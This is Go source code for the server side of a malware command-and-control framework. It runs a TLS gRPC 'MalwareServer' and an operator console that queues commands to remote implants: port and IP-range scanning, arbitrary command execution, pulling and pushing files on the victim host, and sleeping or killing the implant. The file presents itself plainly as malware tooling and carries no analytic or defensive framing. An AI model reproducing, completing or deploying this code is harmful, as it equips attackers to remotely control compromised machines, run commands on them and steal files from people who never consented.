package main

import (
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"malware/common/messages"
	"malware/common/types"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/peer"
)

type c2 struct {
	queue chan *messages.CheckCmdReply // Queue of commands to send to implant
	term  *readline.Instance           // Terminal
}

// Colour constants
const (
	RESET = "\033[0m"
	RED   = "\033[31m"
)

// Called when receiving a non-heartbeat message from implant
// TODO: Should do some other stuff rather than just printing it out
func (c2 *c2) handleReply(ip string, reply *messages.CheckCmdRequest) {
	reply.RandomPadding = []byte{}

	log.SetPrefix(RED + "[" + RESET + ip + RED + "]" + RESET + " ")
	if err := reply.GetError(); err != 0 {
		log.Println(RED + "Error: " + types.ErrorToString[err] + RESET)
	} else {
		log.Println(strings.Replace(reply.String(), "\\n", "\n", -1) + "")
	}
}

// Get an IP from a grpc message context
func get_ip(ctx context.Context) string {
	if peer, ok := peer.FromContext(ctx); ok {
		return peer.Addr.String()
	} else {
		return "no ip"
	}
}

// Server listening function
// Called automagically by grpc
func (c2 *c2) CheckCommandQueue(ctx context.Context, req *messages.CheckCmdRequest) (*messages.CheckCmdReply, error) {
	if req.GetHeartbeat() > 0 {
		select {
		case msg, ok := <-c2.queue:
			if ok {
				return msg, nil
			} else {
				panic("C2 Message Queue closed")
			}
		default:
			// No message in queue
		}
	} else {
		c2.handleReply(get_ip(ctx), req)
	}

	// We don't have anything to actually send back, so lets just reply with a heartbeat
	return messages.C2_heartbeat(time.Now().Unix()), nil
}

func help() {
	log.Println("Commands: (If module is enabled)")
	log.Println("\tlist                      -> List enabled modules")
	log.Println("\tportscan <ip> <from> <to> -> Scan ports")
	log.Println("\tportscan cancel           -> Cancel portscan")
	log.Println("\tipscan <iprange>          -> Scan iprange ie: 10.0.0.1/24")
	log.Println("\tipscan cancel             -> Cancel ipscan")
	log.Println("\texec <cmd>                -> Exec command")
	log.Println("\tgetfile <filename>        -> Get file from server")
	log.Println("\tputfile <local> <remote>  -> Put file from server")
	log.Println("\tkill                      -> Kill the implant")
	log.Println("\tsleep <seconds>           -> Sleep the implant")
}

func incorrect_usage() {
	fmt.Println("Incorrect usage")
	help()
}

// Handle user input
func (c2 *c2) handle_user_input(text string) {
	parts := strings.Split(strings.TrimSpace(text), " ")

	switch parts[0] {
	case "ipscan":
		if len(parts) != 2 {
			incorrect_usage()
			return
		}
		if strings.Compare("cancel", parts[1]) == 0 {
			c2.queue <- messages.C2_ipscan_cancel()
		} else {
			c2.queue <- messages.C2_ipscan_range(parts[1])
		}
	case "portscan":
		if len(parts) == 2 && strings.Compare("cancel", parts[1]) == 0 {
			// Cancel the scan
			c2.queue <- messages.C2_portscan_cancel()
			return
		}

		if len(parts) != 4 {
			incorrect_usage()
			return
		}
		start, err := strconv.Atoi(parts[2])
		if err != nil {
			incorrect_usage()
			return
		}
		end, err := strconv.Atoi(parts[3])
		if err != nil {
			incorrect_usage()
			return
		}

		c2.queue <- messages.C2_portscan_range(parts[1], uint32(start), uint32(end))
	case "exec":
		if len(parts) < 2 {
			incorrect_usage()
			return
		}

		c2.queue <- messages.C2_exec(parts[1], parts[2:])
	case "getfile":
		if len(parts) != 2 {
			incorrect_usage()
			return
		}

		c2.queue <- messages.C2_getfile(parts[1])
	case "putfile":
		if len(parts) != 3 {
			incorrect_usage()
			return
		}
		out, err := ioutil.ReadFile(parts[1])
		if err != nil {
			fmt.Println("Can't find file: ", parts[1])
			return
		}

		c2.queue <- messages.C2_uploadfile(parts[2], out)
	case "list":
		c2.queue <- messages.C2_listmodules()
	case "kill":
		c2.queue <- messages.C2_kill()
		log.Println("Killed implant")
	case "sleep":
		if len(parts) != 2 {
			incorrect_usage()
			return
		}
		seconds, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println("Not a valid int: " + parts[1])
			return
		}

		log.Println("Implant sleeping...")
		c2.queue <- messages.C2_sleep(int64(seconds))
	case "help":
		help()
	default:
		log.Println("Cmd not found: ", parts[0])
	}
}

// Read user input until a ctrl+d
func (c2 *c2) ReadUserInput() {
	for {
		line, err := c2.term.Readline()
		if err == readline.ErrInterrupt {
			continue
		} else if err == io.EOF {
			break
		}

		c2.handle_user_input(line)

	}
}

// Function constructor - constructs new function for listing given directory
// Used for putfile auto tabcomplete
func listfiles(line string) []string {
	names := make([]string, 0)

	filename := strings.TrimSpace(line)
	parts := strings.Split(filename, " ")
	var dir string
	if len(parts) == 1 {
		dir = "./"
	} else {
		filename = parts[1]
		last_index := strings.LastIndex(filename, "/")

		if last_index == -1 {
			last_index = len(filename) - 1
		}

		dir = filename[:last_index+1]
		filename = filename[last_index+1:]
	}

	files, _ := ioutil.ReadDir(dir)
	for _, f := range files {
		if (dir == "./" || strings.HasPrefix(f.Name(), filename)) && !strings.HasPrefix(f.Name(), ".") {
			names = append(names, dir+f.Name())
		}
	}
	return names
}

var completer = readline.NewPrefixCompleter( // Tab completer
	readline.PcItem("exec"),
	readline.PcItem("getfile"),
	readline.PcItem("putfile", readline.PcItemDynamic(listfiles)),
	readline.PcItem("portscan", readline.PcItem("cancel")),
	readline.PcItem("ipscan", readline.PcItem("cancel")),
	readline.PcItem("kill"),
	readline.PcItem("list"),
	readline.PcItem("sleep"),
	readline.PcItem("help"),
)

func main() {
	if len(os.Args) != 3 {
		panic("Require Cert and Key as argument")
	}

	creds, err := credentials.NewServerTLSFromFile(os.Args[1], os.Args[2])

	if err != nil {
		panic(err)
	}

	log.SetFlags(log.Ltime)

	reader, err := readline.NewEx(&readline.Config{
		Prompt:          RED + "c2%" + RESET + " ",
		HistoryFile:     "/tmp/c2_history.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold: true,
	})

	if err != nil {
		panic(err)
	}
	defer reader.Close()
	log.SetOutput(reader.Stderr())

	// Will be replaced on creation from malware generation
	c2 := &c2{queue: make(chan *messages.CheckCmdReply, 100), term: reader}

	host := fmt.Sprintf(":%d", _C2_PORT_)
	listener, err := net.Listen("tcp", host)

	if err != nil {
		panic(err)
	}

	defer listener.Close()

	server := grpc.NewServer(grpc.Creds(creds))

	messages.RegisterMalwareServer(server, c2)

	go func() {
		c2.ReadUserInput() // Read user input async
		server.Stop()

	}()
	server.Serve(listener)
	fmt.Println("Exiting due to listener shutting down")
}
